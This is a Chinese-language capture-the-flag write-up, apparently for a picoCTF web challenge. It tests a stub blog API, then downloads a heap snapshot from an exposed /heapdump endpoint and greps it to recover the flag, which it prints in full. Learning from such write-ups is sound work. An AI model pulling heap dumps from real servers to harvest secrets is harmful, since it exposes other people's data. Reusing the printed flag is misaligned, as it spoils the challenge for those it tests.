使用 `/api-docs/` 的各种功能
- 尝试发布 post
    ```http
    POST /api/posts HTTP/1.1

    {
        "title": "My New Post",
        "content": "Content of the new post.",
        "author": "Alice"
    }
    ```
    - 响应
        ```json
        {
            "id":"3",
            "title":"My New Post",
            "content":"Content of the new post.",
            "author":"Alice",
            "createdAt":"2026-09-22T12:43:04.328Z",
            "updatedAt":"2026-09-22T12:43:04.328Z"
        }
        ```

- 读取所有 posts
    ```http
    GET /api/posts HTTP/1.1
    ```    
    - 响应
        ```json
        [{
            "id": "1",
            "title": "My First Post",
            "content": "This is the content of my first post.",
            "author": "John Doe",
            "createdAt": "2026-09-22T12:44:03.732Z",
            "updatedAt": "2026-09-22T12:44:03.732Z"
        }, {
            "id": "2",
            "title": "My Second Post",
            "content": "This is the content of my second post.",
            "author": "Jane Doe",
            "createdAt": "2026-09-22T12:44:03.732Z",
            "updatedAt": "2026-09-22T12:44:03.732Z"
        }]
        ```
        - 仅返回2条，无新建的 id 3
    
- 使用请求特定 post 的功能
    ```http
    GET /api/posts/1 HTTP/1.1
    ```
    - 响应仅返回 id 1，甚至不包含 id 2
    - 并且浏览器端使用 JS 禁用 id 修改

- 使用更新功能
    ```http
    PUT /api/posts/1 HTTP/1.1

    {
        "title": "Updated Title",
        "content": "Updated content of the post.",
        "author": "John Doe"
    }
    ```
    - 响应
        ```json
        {
            "id": "1",
            "title": "Updated Title",
            "content": "Updated content of the post.",
            "author": "John Doe",
            "createdAt": "2026-09-22T12:47:59.246Z",
            "updatedAt": "2026-09-22T12:47:59.246Z"
        }
        ```
        - 然而，继续使用 get id=1 的查询端点，得到旧版回应

- 分析
    - 当前 api 端点似乎仅为无实际功能的硬编码示例

使用堆导出功能
- 请求
    ```http
    HEAD /heapdump HTTP/1.1
    ```
    - 响应
        ```http
        HTTP/1.1 200 OK
        Content-Disposition: attachment; filename="heapdump-1790084091276.heapsnapshot"
        Content-Length: 10585231
        ```

    - 文件大小 10MB，之前 GET 得到被截断的数据很奇怪，于是此处使用 HEAD 查看。每次立即响应新的转储文件。
    - 域名对应的 IP 地址为 AWS 的 EC2，下载速度 10~30KB/s

- 内存快照保存有字符串信息，下载完成后搜索其中的字符串
    ```sh
    cat heapdump-1790084500972.heapsnapshot | grep "picoCTF{"
    picoCTF{Pat!3nt_15_Th3_K3y_dcffa92e}
    ```
    - 使用浏览器开发者工具的导入堆快照失败。而字符串将被储存到 strings 字段中，于是此处直接 grep。或者按照结构提取 strings 字段后搜索或打印所有内容
